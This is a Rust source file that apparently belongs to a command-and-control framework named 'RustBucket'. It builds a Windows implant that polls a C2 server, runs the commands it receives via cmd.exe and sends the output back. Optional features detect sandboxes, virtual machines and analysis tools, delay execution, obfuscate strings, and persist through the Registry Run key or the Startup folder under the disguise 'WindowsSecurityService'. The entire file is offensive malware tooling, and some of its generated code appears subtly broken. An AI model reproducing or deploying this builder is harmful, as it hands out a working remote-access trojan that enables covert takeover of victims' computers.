//! Module for generating a Windows-compatible payload executable for the RustBucket C2 system.
//!
//! The payload connects back to the C2 server, polls for tasks, executes them, and returns output.
use std::fs;
use std::process::Command;
use std::path::{Path, PathBuf};
use std::error::Error;
use std::fmt;

#[derive(Debug, Clone, Copy)]
pub enum TransportProtocol {
    Http,
    Https,
    Dns,
}

impl fmt::Display for TransportProtocol {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TransportProtocol::Http => write!(f, "http"),
            TransportProtocol::Https => write!(f, "https"),
            TransportProtocol::Dns => write!(f, "dns"),
        }
    }
}

/// Configuration options for payload generation
#[derive(Debug)]
pub struct PayloadConfig {
    pub lhost: String,
    pub lport: u16,
    pub protocol: TransportProtocol,
    pub poll_interval: u64,
    pub stealth_mode: bool,
    pub persistence: Option<PersistenceMethod>,
    pub jitter: u8,
}

impl Default for PayloadConfig {
    fn default() -> Self {
        Self {
            lhost: "localhost".to_string(),
            lport: 8080,
            protocol: TransportProtocol::Http,
            poll_interval: 5,
            stealth_mode: false,
            persistence: None,
            jitter: 10,
        }
    }
}

/// Methods for payload persistence on Windows systems
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    RegistryRun,
    WindowsService,
    StartupFolder,
    ScheduledTask,
}

pub struct Payload;

impl Payload {
    /// Generate a Windows-compatible EXE payload with default configuration.
    ///
    /// # Arguments
    ///
    /// * `lhost` - Listener host (IP address or domain name) for the C2 server callback.
    /// * `lport` - Listener port on which the C2 server is expecting connections.
    ///
    /// # Returns
    ///
    /// * `Ok(PathBuf)` containing the file path to the generated `.exe` on success.
    /// * `Err` if an error occurs (e.g., I/O failure or compilation error).
    pub fn generate(lhost: &str, lport: u16) -> Result<PathBuf, Box<dyn Error>> {
        let config = PayloadConfig {
            lhost: lhost.to_string(),
            lport,
            ..Default::default()
        };
        
        Self::generate_with_config(&config)
    }
    
    /// Generate a Windows-compatible EXE payload with advanced configuration options.
    ///
    /// # Arguments
    ///
    /// * `config` - Configuration options for the payload.
    ///
    /// # Returns
    ///
    /// * `Ok(PathBuf)` containing the file path to the generated `.exe` on success.
    /// * `Err` if an error occurs (e.g., I/O failure or compilation error).
    pub fn generate_with_config(config: &PayloadConfig) -> Result<PathBuf, Box<dyn Error>> {
        // 1. Setup a temporary directory for the payload project.
        let build_dir = Path::new("rb_payload_build");
        if build_dir.exists() {
            fs::remove_dir_all(build_dir)?;  // Clean up any previous build artifacts
        }
        fs::create_dir_all(build_dir.join("src"))?;  // Create project directory and src/ subdirectory

        // 2. Create Cargo.toml for the new project with required dependencies
        let mut cargo_deps = vec!["ureq = \"2.6.1\""];  // Always need HTTP client
        
        if config.stealth_mode {
            cargo_deps.push("sysinfo = \"0.29.0\"");  // For process detection
            cargo_deps.push("obfstr = \"0.4.3\"");    // For string obfuscation
            cargo_deps.push("rand = \"0.8.5\"");     // For randomization
            cargo_deps.push("hostname = \"0.3.1\"");
        }
        
        if config.persistence.is_some() {
            cargo_deps.push("winreg = \"0.11.0\""); // Registry operations
            cargo_deps.push("directories = \"5.0.1\""); // User directories
        }
        
        let cargo_manifest = format!(
            "[package]\n\
            name = \"rb_payload\"\n\
            version = \"0.1.0\"\n\
            edition = \"2021\"\n\n\
            [dependencies]\n\
            {}\n\
            \n\
            [profile.release]\n\
            opt-level = \"z\"  # Optimize for size\n\
            lto = true         # Enable Link Time Optimization\n\
            codegen-units = 1  # Reduce parallel code generation units to increase optimization\n\
            panic = \"abort\"    # Abort on panic\n\
            strip = true       # Strip symbols from binary\n",
            cargo_deps.join("\n")
        );
        
        fs::write(build_dir.join("Cargo.toml"), cargo_manifest)?;

        // 3. Generate the Rust source code for the agent with the specified configuration
        let agent_code = Self::generate_agent_code(config)?;
        fs::write(build_dir.join("src").join("main.rs"), agent_code)?;

        // 4. Invoke Cargo to compile the project for Windows target
        println!("Building payload for Windows target...");
        
        let output = Command::new("cargo")
           .current_dir(build_dir)
           .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
           .output()?;

        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(format!("Cargo build failed: {}", error_msg).into());
}
        // 5. Determine the path of the compiled executable (.exe) in target directory.
        let exe_path = build_dir
            .join("target")
            .join("x86_64-pc-windows-gnu")
            .join("release")
            .join("rb_payload.exe");
            
        if !exe_path.exists() {
            return Err("Compiled payload executable not found".into());
        }

        println!("Successfully built payload: {}", exe_path.display());
        // 6. Return the path to the generated payload binary.
        Ok(exe_path)
    }
    
    /// Generate the Rust source code for the agent with the specified configuration
    fn generate_agent_code(config: &PayloadConfig) -> Result<String, Box<dyn Error>> {
    // Base URL format depends on protocol
    let base_url_format = match config.protocol {
        TransportProtocol::Http => format!("http://{}:{}", config.lhost, config.lport),
        TransportProtocol::Https => format!("https://{}:{}", config.lhost, config.lport),
        TransportProtocol::Dns => {
            // DNS protocol would require a custom implementation
            return Err("DNS protocol not yet implemented".into());
        }
    };
    
    // Anti-analysis and sandbox detection code for stealth mode
    let stealth_imports = if config.stealth_mode {
        r#"
use sysinfo::{System, SystemExt, ProcessExt};
use obfstr::obfstr;  // String obfuscation
use rand::{thread_rng, Rng};
use hostname;
"#
    } else {
        ""
    };
    
    // Sandbox/VM detection code for stealth mode
    let stealth_checks = if config.stealth_mode {
        r#"
    // Anti-analysis checks
    if is_under_analysis() {
        // Exit silently if running in analysis environment
        std::process::exit(0);
    }
    
    // Initial sleep to evade sandbox (random 30-60 seconds)
    let initial_sleep = thread_rng().gen_range(30..60);
    sleep(Duration::from_secs(initial_sleep));
"#
    } else {
        ""
    };
    
    // Persistence mechanism based on the selected method
    let persistence_code = match config.persistence {
        Some(PersistenceMethod::RegistryRun) => {
            r#"
    // Registry persistence
    let exe_path = std::env::current_exe()?;
    let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        winreg::enums::KEY_SET_VALUE
    )?;
    run_key.set_value("WindowsSecurityService", &exe_path.to_string_lossy().to_string())?;
"#
        },
        Some(PersistenceMethod::StartupFolder) => {
            r#"
    // Startup folder persistence
    if let Some(dirs) = directories::BaseDirs::new() {
        let exe_path = std::env::current_exe()?;
        let startup_dir = dirs.config_dir().join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        if startup_dir.exists() {
            let target_path = startup_dir.join("WindowsSecurityService.exe");
            std::fs::copy(exe_path, target_path)?;
        }
    }
"#
        },
        Some(_) | None => "", // Other methods not implemented yet
    };
    
    // Add jitter to timing if specified
    let sleep_with_jitter = if config.jitter > 0 {
        format!(
            r#"
    // Add jitter to poll interval
    fn sleep_with_jitter(base_seconds: u64) {{
        let jitter_factor = thread_rng().gen_range(100 - {0}..=100 + {0}) as f64 / 100.0;
        let sleep_time = (base_seconds as f64 * jitter_factor).round() as u64;
        sleep(Duration::from_secs(sleep_time));
    }}
"#,
            config.jitter.min(30) // Cap jitter at 30%
        )
    } else {
        "".to_string()
    };
    
    // Helper functions for stealth mode
    let stealth_functions = if config.stealth_mode {
        r#"
// Check if we're running in an analysis environment
fn is_under_analysis() -> bool {
    let s = System::new_all();
    
    // Check for analysis tools
    let suspicious_processes = [
        "wireshark", "procmon", "processhacker", "x64dbg", "ida", 
        "ghidra", "ollydbg", "immunity", "pestudio", "process explorer"
    ];
    
    // Check system properties for VM indicators
    let vm_indicators = [
        "vmware", "virtualbox", "vbox", "qemu", "xen"
    ];
    
    // Check for analysis tools
    for process in s.processes().values() {
        let name = process.name().to_lowercase();
        if suspicious_processes.iter().any(|&p| name.contains(p)) {
            return true;
        }
    }
    
    // Check hardware/manufacturer info for VM indicators
    let hostname = hostname::get()
        .unwrap_or_default()
        .to_string_lossy()
        .to_lowercase();
        
    if vm_indicators.iter().any(|&v| hostname.contains(v)) {
        return true;
    }
    
    // Check number of CPUs (VMs often have few cores)
    if s.cpus().len() < 2 {
        return true;
    }
    
    // Check RAM (VMs often have limited RAM)
    let ram_gb = s.total_memory() / 1024 / 1024 / 1024;
    if ram_gb < 4 {
        return true;
    }
    
    false
}
"#
    } else {
        ""
    };
    
    // Sleep mechanism based on jitter settings
    let sleep_mechanism = if config.jitter > 0 {
        format!("sleep_with_jitter({});", config.poll_interval)
    } else {
        format!("sleep(Duration::from_secs({}));", config.poll_interval)
    };
    
    // Complete agent code - recreating without using format!
    let code = String::from(r#"
    use std::process::Command;
    use std::thread::sleep;
    use std::time::Duration;
    use std::io;
    "#) + stealth_imports + r#"

    "#+ stealth_functions + r#"

    fn main() -> io::Result<()> {
        let server = ""# + &config.lhost + r#"";
        let port = "# + &config.lport.to_string() + r#";
        let base_url = ""# + &base_url_format + r#"";
    
    "# + stealth_checks + r#"
    
    "# + persistence_code + r#"
    
    "# + &sleep_with_jitter + r#"

        loop {
        // Poll the C2 server for tasks
            let task_url = format!("{}/tasks", base_url);
            let resp = match ureq::get(&task_url).call() {
                Ok(response) => response,
                Err(_e) => {
                // Network error (server may be down); wait and retry
    "# + &sleep_mechanism + r#"
                    continue;
                }
            };
        
            let task = resp.into_string().unwrap_or_default();
            if task.is_empty() {
            // No task available; wait and poll again
    "# + &sleep_mechanism + r#"
                continue;
            }
        
        // Execute the received task/command
            match Command::new("cmd.exe").args(&["/C", &task]).output() {
                Ok(output) => {
                // Capture and combine stdout and stderr
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let result = format!("{}{}", stdout, stderr);
                
                // Send the output back to the C2 server
                    let result_url = format!("{}/results", base_url);
                    let _ = ureq::post(&result_url).send_string(&result);
                },
                Err(e) => {
                // Command execution failed; send error back
                    let result_url = format!("{}/results", base_url);
                    let _ = ureq::post(&result_url)
                        .send_string(&format!("Failed to execute task: {}", e));
                }
         }
        
        // Short delay before next poll cycle
    "# + &sleep_mechanism + r#"
        }
    }
    "#;

        Ok(code)
   

    }
}
